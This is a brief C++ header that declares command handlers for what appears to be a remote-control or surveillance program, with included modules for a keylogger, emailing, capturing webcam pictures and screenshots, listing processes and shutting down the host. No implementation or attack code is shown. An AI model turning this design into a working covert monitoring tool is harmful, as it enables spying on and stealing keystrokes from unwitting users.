#pragma once
#include "lib.h"
#include "listProgram.h"
#include "config.h"
#include "sendEmail.h"
#include "shutdownProgram.h"
#include "sendPicture.h"
#include "sendScreenshot.h"
#include "keylogger.h"

std::string trim_command(std::string command);

void execute_command(const std::string& command);

void handle_start_program(const std::string& command);

void handle_shutdown_program(const std::string& command);

void handle_get_picture();

void handle_get_screenshot();

void handle_list_programs();
void handle_list_processes();

void handle_shutdown();

void handle_keylogger(const std::string& command);